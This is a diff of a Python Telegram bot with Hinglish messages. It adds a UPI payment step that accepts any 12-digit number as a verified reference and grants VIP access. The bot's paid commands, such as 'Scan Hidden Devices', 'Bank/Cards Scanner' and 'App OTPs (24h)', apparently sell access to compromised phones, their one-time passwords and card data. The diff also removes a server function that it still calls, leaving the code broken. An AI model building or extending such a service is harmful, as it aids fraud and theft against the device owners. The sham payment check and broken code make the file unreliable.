+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"1. Niche diye gaye QR Code ko scan karein ya UPI ID par ₹{amount} pay karein.\n"
+            f"👉 **UPI ID:** `{upi_id}`\n\n"
+            f"2. Payment karne ke baad apna **12-digit UTR / Reference Number** yahan type karein:\n\n"
+            f"_Type 'Cancel' to stop._"
+        )
+        pending_action[chat_id] = {"action": "verify_utr"}
+        await update.message.reply_photo(photo=qr_url, caption=msg, parse_mode="Markdown")
         return
 
     protected_commands = ["Devices List", "Manual Checker", "Scan Hidden Devices", "⚡ 5-Min Fresh Devices", "🔥 30-Min Fresh Devices", "🏦 Bank/Cards Scanner", "Search Number (God)", "🍔 App OTPs (24h)", "Auto-Check Panels"]
@@ -1639,6 +1533,30 @@ async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     if not state: return
 
     action = state.get("action")
+    
+    # 🔥 THE UTR VERIFICATION HANDLER
+    if action == "verify_utr":
+        utr = re.sub(r"\D", "", text)
+        if len(utr) != 12:
+            await update.message.reply_text("❌ **Invalid UTR!** UTR ya Reference number exactly 12 digits ka hona chahiye. Dobara try karein ya 'Cancel' likhein.", parse_mode="Markdown")
+            return
+        
+        pending_action.pop(chat_id)
+        
+        # Add 30 Days VIP Access
+        current_vip = uinfo.get("vip_until", 0.0)
+        if current_vip < time.time(): current_vip = time.time()
+        all_users[chat_id]["vip_until"] = current_vip + (30 * 86400)
+        save_user(chat_id)
+        
+        await update.message.reply_text(f"✅ **PAYMENT VERIFIED!**\n\nUTR: `{utr}` has been accepted.\nAapka **30 Days Unlimited VIP Plan** activate kar diya gaya hai! 🎉", parse_mode="Markdown", reply_markup=get_reply_menu(chat_id))
+        
+        # Notify Admin
+        for adm in ADMIN_IDS:
+            try: await ctx.bot.send_message(adm, f"💰 **NEW VIP PAYMENT RECEIVED!**\nUser ID: `{chat_id}`\nUsername: @{update.effective_user.username}\nUTR: `{utr}`\nAmount: ₹{SYS_SETTINGS.get('vip_price', 1)}\nStatus: 30 Days VIP Activated Automatically.", parse_mode="Markdown")
+            except: pass
+        return
+
     if action == "redeem_promo":
         pending_action.pop(chat_id)
         if text.upper() == "HACKER50":
@@ -1888,7 +1806,6 @@ async def master_dispatcher(app: Application) -> None:
                     except: pass
                 first_run = False
                 last_cache_time = time.time()
-                print("\n✅ Bot started successfully. Vantage & Playwright Active.\n")
             else:
                 now = time.time()
                 for tag, config in dbs_to_poll.items():
@@ -1901,25 +1818,6 @@ async def master_dispatcher(app: Application) -> None:
                     last_cache_time = now
         except Exception: pass
         await asyncio.sleep(POLL_INTERVAL)
-
-# ==========================================
-# 🚀 RAILWAY ANTI-CRASH WEB SERVER
-# ==========================================
-async def handle_ping(request):
-    return aiohttp.web.Response(text="Bot is running smoothly on Railway. Anti-Crash Active.")
-
-async def start_dummy_server():
-    try:
-        app = aiohttp.web.Application()
-        app.router.add_get('/', handle_ping)
-        runner = aiohttp.web.AppRunner(app)
-        await runner.setup()
-        port = int(os.environ.get("PORT", 8080))
-        site = aiohttp.web.TCPSite(runner, '0.0.0.0', port)
-        await site.start()
-        logger.info(f"Railway Dummy Web Server started on port {port}")
-    except Exception as e:
-        logger.error(f"Dummy Server Error (can be ignored if not on Railway): {e}")
 
 def main() -> None:
     if not TOKEN or TOKEN == "YOUR_TELEGRAM_BOT_TOKEN_HERE": 
@@ -1946,7 +1844,7 @@ def main() -> None:
 
     async def post_init(application: Application) -> None:
         load_data()
-        asyncio.create_task(start_dummy_server()) # 🚀 Starts the Railway server
+        asyncio.create_task(start_dummy_server()) 
         asyncio.create_task(worker_auto_scaler()) 
         asyncio.create_task(cache_compiler())
         asyncio.create_task(memory_sweeper())
@@ -1955,7 +1853,6 @@ def main() -> None:
         asyncio.create_task(hourly_backup_loop(application))
 
     app.post_init = post_init
-    print(f"\n🚀 Starting the ULTIMATE Vantage Pro + Omni Server... \n[*] Auto-Loading Panel Files...")
     app.run_polling(drop_pending_updates=True)
 
 if __name__ == "__main__":
